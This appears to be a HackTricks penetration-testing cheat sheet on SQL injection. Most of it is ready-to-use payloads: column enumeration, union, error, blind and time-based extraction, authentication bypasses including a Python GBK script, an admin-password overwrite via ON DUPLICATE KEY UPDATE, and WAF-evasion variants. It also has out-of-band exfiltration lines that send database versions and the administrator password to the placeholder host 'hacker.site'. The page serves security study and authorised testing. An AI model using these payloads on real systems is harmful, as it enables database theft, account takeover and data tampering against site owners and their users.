# SQL Injection

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.

{% embed url="https://www.rootedcon.com/" %}

## What is SQL injection?

SQL injection is a web security vulnerability that allows an attacker to **interfere** with the **queries** that an application makes to its **database**. It generally allows an attacker to **view data** that they are not normally able to retrieve. This might include data belonging to **other users**, or any other data that the **application** itself is able to **access**. In many cases, an attacker can **modify** or **delete** this data, causing persistent changes to the application's content or behaviour.\
In some situations, an attacker can escalate an SQL injection attack to **compromise the underlying server** or other back-end infrastructure, or perform a denial-of-service attack. (From [here](https://portswigger.net/web-security/sql-injection)).

> In this POST I'm going to suppose that we have found a possible SQL injection and we are going to discuss possible methods to confirm the SQL injection, recon the database and perform actions.

## Entry point detection

You may have found a site that is **apparently vulnerable to SQL**i just because the server is behaving weird with SQLi related inputs. Therefore, the **first thing** you need to do is how to **inject data in the query without breaking it.** To do so you first need to find how to **escape from the current context.**\
These are some useful examples:

```
 [Nothing]
'
"
`
')
")
`)
'))
"))
`))
```

Then, you need to know how to **fix the query so there isn't errors**. In order to fix the query you can **input** data so the **previous query accept the new data**, or you can just **input** your data and **add a comment symbol add the end**.

_Note that if you can see error messages or you can spot differences when a query is working and when it's not this phase will be more easy._

### **Comments**

```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```

### Confirming with logical operations

One of the best ways to confirm a SQL injection is by making it operate a **logical operation** and having the expected results.\
For example: if the GET parameter `?username=Peter` returns the same content as `?username=Peter' or '1'='1` then, you found a SQL injection.

Also you can apply this concept to **mathematical operations**. Example: If `?id=1` returns the same as `?id=2-1`, SQLinjection.

```
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```

This word-list was created to try to **confirm SQLinjections** in the proposed way:

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### Confirming with Timing

In some cases you **won't notice any change** on the page you are testing. Therefore, a good way to **discover blind SQL injections** is making the DB perform actions and will have an **impact on the time** the page need to load.\
Therefore, the we are going to concat in the SQL query an operation that will take a lot of time to complete:

```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

In some cases the **sleep functions won't be allowed**. Then, instead of using those functions you could make the query **perform complex operations** that will take several seconds. _Examples of these techniques are going to be commented separately on each technology (if any)_.

### Identifying Back-end

The best way to identify the back-end is trying to execute functions of the different back-ends. You could use the _**sleep**_ **functions** of the previous section or these ones:

```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```

Also, if you have access to the output of the query, you could make it **print the version of the database**.

{% hint style="info" %}
A continuation we are going to discuss different methods to exploit different kinds of SQL Injection. We will use MySQL as example.
{% endhint %}

### Identifying with PortSwigger

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## Exploiting Union Based

### Detecting number of columns

If you can see the output of the query this is the best way to exploit it.\
First of all, wee need to find out the **number** of **columns** the **initial request** is returning. This is because **both queries must return the same number of columns**.\
Two methods are typically used for this purpose:

#### Order/Group by

Keep incrementing the number until you get a False response. Even though GROUP BY and ORDER BY have different functionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.

```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True
```

#### UNION SELECT

Select more and more null values until the query is correct:

```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```

_You should use `null`values as in some cases the type of the columns of both sides of the query must be the same and null is valid in every case._

### Extract database names, table names and column names

On the next examples we are going to retrieve the name of all the databases, the table name of a database, the column names of the table:

```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```

_There is a different way to discover this data on every different database, but it's always the same methodology._

## Exploiting Hidden Union Based

If you can see the output of the query but you can't achieve a union based injection, you are dealing with a hidden union based injection.\
In this situation you end up with a blind injection. To turn the blind injection to a union based one, you need to extract the query being executed on the backend.\
You can do so by use of the blind injection and the default tables of your target DBMS. To learn about those default tables read the documentation of your target DBMS.\
After extracting the query, you need to adjust your payload accordingly, closing the original query safely. Then append a union query to your payload and start exploiting the newly obtained union based injection.

Complete Article: https://medium.com/@Rend\_/healing-blind-injections-df30b9e0e06f

## Exploiting Error based

If for some reason you **cannot** see the **output** of the **query** but you can **see the error messages**, you can make this error messages to **ex-filtrate** data from the database.\
Following a similar flow as in the Union Based exploitation you could manage to dump the DB.

```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```

## Exploiting Blind SQLi

In this case you cannot see the results of the query or the errors, but you can **distinguished** when the query **return** a **true** or a **false** response because there are different contents on the page.\
In this case, you can abuse that behaviour to dump the database char by char:

```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```

## Exploiting Error Blind SQLi

This is the **same case as before** but instead of distinguish between a true/false response from the query you can **distinguish between** an **error** in the SQL query or not (maybe because the HTTP server crashes). Therefore, in this case you can force an SQLerror each time you guess correctly the char:

```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```

## Exploiting Time Based SQLi

In this case there **isn't** any way to **distinguish** the **response** of the query based on the context of the page. But, you can make the page **take longer to load** if the guessed character is correct. We have already saw this technique in use before in order to [confirm a SQLi vuln](./#confirming-with-timing).

```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```

## Stacked Queries

You can use stacked queries to **execute multiple queries in succession**. Note that while the subsequent queries are executed, the **results** are **not returned to the application**. Hence this technique is primarily of use in relation to **blind vulnerabilities** where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

**Oracle** doesn't support **stacked queries.** **MySQL, Microsoft** and **PostgreSQL** support them: `QUERY-1-HERE; QUERY-2-HERE`

## Out of band Exploitation

If **no-other** exploitation method **worked**, you may try to make the **database ex-filtrate** the info to an **external host** controlled by you. For example, via DNS queries:

```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```

### Out of band data exfiltration via XXE

```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```

## Automated Exploitation

Check the [SQLMap Cheetsheat](sqlmap/) to exploit a SQLi vulnerability with [**sqlmap**](https://github.com/sqlmapproject/sqlmap).

## Tech specific info

We have already discussed all the ways to exploit a SQL Injection vulnerability. Find some more tricks database technology dependant in this book:

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

Or you will find **a lot of tricks regarding: MySQL, PostgreSQL, Oracle, MSSQL, SQLite and HQL in** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)



<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.

{% embed url="https://www.rootedcon.com/" %}

## Authentication bypass

List to try to bypass the login functionality:

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### Authentication Bypass (Raw MD5)

When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.

```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```

Allowing an attacker to craft a string with a `true` statement such as `' or 'SOMETHING`

```sql
md5("ffifdyop", true) = 'or'6�]��!r,��b�
```

Challenge demo available at [http://web.jarvisoj.com:32772](http://web.jarvisoj.com:32772)

### Hash Authentication Bypass

```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```

**Recommended list**:

You should use as username each line of the list and as password always: _**Pass1234.**_\
_(This payloads are also included in the big list mentioned at the beginning of this section)_

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### GBK Authentication Bypass

IF ' is being scaped you can use %A8%27, and when ' gets scaped it will be created: 0xA80x5c0x27 (_╘'_)

```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```

Python script:

```python
import requests
url = "http://example.com/index.php" 
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3') 
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"} 
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url}) 
print r.text
```

### Polyglot injection (multicontext)

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

## Insert Statement

### Modify password of existing object/user

To do so you should try to **create a new object named as the "master object"** (probably **admin** in case of users) modifying something:

* Create user named: **AdMIn** (uppercase & lowercase letters)
* Create a user named: **admin=**
* **SQL Truncation Attack** (when there is some kind of **length limit** in the username or email) --> Create user with name: **admin \[a lot of spaces] a**

#### SQL Truncation Attack

If the database is vulnerable and the max number of chars for username is for example 30 and you want to impersonate the user **admin**, try to create a username called: "_admin \[30 spaces] a_" and any password.

The database will **check** if the introduced **username** **exists** inside the database. If **not**, it will **cut** the **username** to the **max allowed number of characters** (in this case to: "_admin \[25 spaces]_") and the it will **automatically remove all the spaces at the end updating** inside the database the user "**admin**" with the **new password** (some error could appear but it doesn't means that this hasn't worked).

More info: [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_Note: This attack will no longer work as described above in latest MySQL installations. While comparisons still ignore trailing whitespace by default, attempting to insert a string that is longer than the length of a field will result in an error, and the insertion will fail. For more information about about this check_ [_https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation_](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)\_\_

### MySQL Insert time based checking

Add as much `','',''` as you consider to exit the VALUES statement. If delay is executed, you have a SQLInjection.

```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```

### ON DUPLICATE KEY UPDATE

ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:

```
Inject using payload:
  attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" --

The query would look like this:
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" -- ", "bcrypt_hash_of_your_password_input");

This query will insert a row for the user “attacker_dummy@example.com”. It will also insert a row for the user “admin@example.com”.
Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to "bcrypt_hash_of_qwerty".

After this, we can simply authenticate with “admin@example.com” and the password “qwerty”!
```

### Extract information

#### Creating 2 accounts at the same time

When trying to create a new user and username, password and email are needed:

```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```

#### Using decimal or hexadecimal

With this technique you can extract information creating only 1 account. It is important to note that you don't need to comment anything.

Using **hex2dec** and **substr**:

```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```

To get the text you can use:

```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```

Using **hex** and **replace** (and **substr**):

```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.

{% embed url="https://www.rootedcon.com/" %}

## Routed SQL injection

Routed SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output. ([Paper](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

Example:

```sql
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```

## WAF Bypass

### No spaces bypass

No Space (%20) - bypass using whitespace alternatives

```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```

No Whitespace - bypass using comments

```sql
?id=1/*comment*/and/**/1=1/**/--
```

No Whitespace - bypass using parenthesis

```sql
?id=(1)and(1)=(1)--
```

### No commas bypass

No Comma - bypass using OFFSET, FROM and JOIN

```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```

### Generic Bypasses

Blacklist using keywords - bypass using uppercase/lowercase

```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```

Blacklist using keywords case insensitive - bypass using an equivalent operator

```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```

### Scientific Notation WAF bypass

You can find a more in depth explaination of this trick in [gosecure blog](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/).\
Basically you can use the scientific notation in unexpected ways for the WAF to bypass it:

```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```

### Bypass Column Names Restriction

First of all, notice that if the **original query and the table where you want to extract the flag from have the same amount of columns** you might just do: `0 UNION SELECT * FROM flag`

It’s possible to **access the third column of a table without using its name** using a query like the following: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, so in an sqlinjection this would looks like:

```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```

Or using a **comma bypass**:

```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```

This trick was taken from [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)

### WAF bypass suggester tools

{% embed url="https://github.com/m4ll0k/Atlas" %}

## Other Guides

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Brute-Force Detection List

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}



​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
